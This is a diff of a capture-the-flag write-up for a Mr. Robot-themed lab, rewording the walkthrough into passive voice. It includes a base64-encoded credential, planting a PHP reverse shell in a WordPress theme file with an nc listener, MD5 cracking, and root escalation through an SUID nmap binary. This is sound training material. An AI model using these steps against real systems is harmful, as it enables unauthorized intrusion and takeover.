@@ -41,7 +41,7 @@ Locate all three hidden keys.
 
 ### Port Scan
 
-We start with a full TCP port scan using `nmap`:
+The enumeration phase begins with a full TCP port scan using `nmap`:
 
 ```bash
 sudo nmap 10.10.202.58 -sV -p- -oA initial_scan
@@ -64,11 +64,11 @@ Navigating to http://10.10.202.58 reveals a minimal interface - just a prompt al
 
 ![Main Page](images/main_page.png)
 
-So we pivot to enumerating potential hidden directories and files.
+The next step is to enumerate potential hidden directories and files.
 
 ### Directory and File Brute-Force
 
-We use `gobuster` to uncover files and directories:
+`gobuster` is used to uncover file and directories:
 
 ```bash
 gobuster dir -u http://10.10.202.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
@@ -82,11 +82,11 @@ This reveals several interesting finds:
     - `fsocity.dic` - dictionary file containing presumably usernames and passwords.
     - `key-1-of-3.txt` - file containing the first flag.
 
-We can read the flag file by navigating to http://10.10.202.58/key-1-of-3.txt
+The flag file is accessible via http://10.10.202.58/key-1-of-3.txt
 
 ### Credential Discovery
 
-Inspecting `license.txt`, we find the following base64-encoded string: `ZWxsaW90OkVSMjgtMDY1Mgo=`. Decoding it via [CyberChef](https://gchq.github.io/CyberChef) reveals a credential pair containing username and password.
+Inspecting `license.txt`, the following base64-encoded string is found: `ZWxsaW90OkVSMjgtMDY1Mgo=`. Decoding it via [CyberChef](https://gchq.github.io/CyberChef) reveals a credential pair containing username and password.
 
 ![Hidden Credentials](images/hidden_credentials.png)
 
@@ -95,23 +95,23 @@ Inspecting `license.txt`, we find the following base64-encoded string: `ZWxsaW90
 
 ### Gaining Access to WordPress
 
-We can login to the WordPress using the previously discovered credentials. Though no flags are directly visible in the dashboard, we can edit theme files - which provide an excellent attack vector.
+Logging into WordPress is successful using the discovered credentials . Though no flags are directly visible in the dashboard, the ability to edit theme files provides an excellent attack vector.
 
 ### Reverse Shell Setup
 
-We select the active theme (e.g., twentyfifteen) and edit the `404.php`. We replace the contents with a PHP reverse shell payload which we can generate from [revshells](https://www.revshells.com/).
+The active theme, such as twentyfifteen, is selected and the `404.php` file is modified to include a PHP reverse shell payload generated from [revshells](https://www.revshells.com/).
 
 ![Theme Editor](images/theme_editor.png)
 
-We modified `404.php`, but any PHP file in the selected theme would have worked as long as it's editable via the WordPress dashboard and directly accessible in the browser.
+`404.php` is modified, but any PHP file in the selected theme would have worked as long as it's editable via the WordPress dashboard and directly accessible in the browser.
 
-Then, we start a listener on our system:
+The next step is to start a listener on the attacking machine:
 
 ```bash
 nc -lvnp 4343
 ```
 
-To execute the reverse shell we have to navigate to:
+To trigger the reverse shell, navigate to:
 
 `http://10.10.202.58/wp-content/themes/twentyfifteen/404.php`
 
@@ -120,13 +120,13 @@ To execute the reverse shell we have to navigate to:
 
 ### Enumerate Users
 
-With a reverse shell, we look for users that are present on the system:
+After obtaining a reverse shell, the system is checked for user accounts by listing the contents of the `/home` directory:
 
 ```bash
 ls -l /home
 ```
 
-We discover a `robot` user.
+A `robot` user is discovered.
 
 ### Enumerate Robot's Home Directory
 
@@ -141,17 +141,17 @@ Results:
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5 
 ```
 
-We can't read `key-2-of-3.txt`, but `password.raw-md5` is world-readable.
+`key-2-of-3.txt` is not readable due to file permissions, but `password.raw-md5` is world-readable.
 
 ```bash
 cat /home/robot/password.raw-md5
 ```
 
-We get an MD5 hash of `robot's` password which we can crack using [CrackStation](https://crackstation.net/)
+An MD5 hash of `robot's` password is obtained, which can crack using [CrackStation](https://crackstation.net/)
 
 ![Crack Station](images/crack_station.png)
 
-Now we can switch to robot and read the second flag:
+After cracking the hash, switching to `robot` allows reading the second flag:
 
 ```bash
 su robot
@@ -163,25 +163,25 @@ cat /home/robot/key-2-of-3.txt
 
 ### Check Sudo Rights
 
-First we can check if the `robot` user has any elevated permissions using `sudo`:
+The next step is to check if the `robot` user has any elevated permissions using `sudo`:
 
 ```bash
 sudo -l
 ```
 
-Output confirms that `robot` has no `sudo` rights. Therefore, we need an alternative method to escalate privileges.
+The output shows that the `robot` user lacks `sudo` privileges, so an alternative method for privilege escalation is required.
 
 ### Enumerating SUID Binaries
 
-SUID (Set User ID) is a special file permission where the executable runs with the privileges of the file owner - often `root`. If we can find a SUID binary that supports command execution, it may be possible to exploit it to gain `root` access.
+SUID (Set User ID) is a special file permission that allows an executable to run with the privileges of the file owner, typically `root`. By identifying a SUID binary that supports command execution, it may be possible to exploit it for `root` access.
 
-We search for such binaries:
+SUID binaries are enumerated with the following command:
 
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
-Among the results we find:
+One of the results shows:
 
 ```bash
 -rwsr-xr-x 1 root root   17272 Jun 2  18:23 /usr/local/bin/nmap
@@ -191,14 +191,14 @@ Among the results we find:
 
 ### Exploit Nmap SUID for Shell
 
-We go to the [GTFOBins](https://gtfobins.github.io/) to see how we can exploit `nmap`.
+The [GTFOBins](https://gtfobins.github.io/) website is checked for a method to exploit `nmap`.
 
-As we can see on the page we can launch `nmap` in the interactive mode:
+The page shows that `nmap` can be launched in interactive mode:
 
 ```bash
 namp --interactive
 ```
-Then we can obtain the `root` shell:
+Executing the following results in a root shell:
 
 ```bash
 nmap> !sh
@@ -206,19 +206,19 @@ nmap> !sh
 
 ## Post-Exploitation
 
-We now check the `/root` directory
+Upon checking the `/root` directory with the following command:
 
 ```bash
 ls -la /root
 ```
 
-and we find:
+The following file is found:
 
 ```bash
 -r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
 ```
 
-We can read it and obtain the third and final flag:
+Reading the file reveals the third and final flag:
 
 ```bash
 cat /root/key-3-of-3.txt
@@ -230,29 +230,21 @@ cat /root/key-3-of-3.txt
 This was a cleverly crafted Mr. Robot-themed CTF, with a strong emphasis on realistic enumeration and privilege escalation. Here's what I did:
 
 - Enumeration & Reconnaissance: Discovered useful paths (`robots.txt`, `license.txt`) and base64-encoded credentials.
-
 - Web Application Exploitation: Logged into WordPress as admin, edited a theme to execute a PHP reverse shell.
-
 - Lateral Movement: Switched users after cracking MD5 password.
-
 - Privilege Escalation: Used an SUID-enabled nmap binary to escalate to `root`.
-
 - Capture Flags: Successfully retrieved all 3 hidden keys.
 
 ### Skills Practiced
 
 - Directory and file enumeration using `gobuster`.
-
 - Base64 decoding and credential extraction.
-
 - Reverse shell creation and listener setup.
-
 - Privilege escalation via SUID misconfiguration.
 
 ### Mitigations
 
 - Never leave sensitive credentials or base64 data in public files.
-
 - Avoid SUID on binaries like `nmap` that can be abused for shell access.
 
 ### Final Thoughts
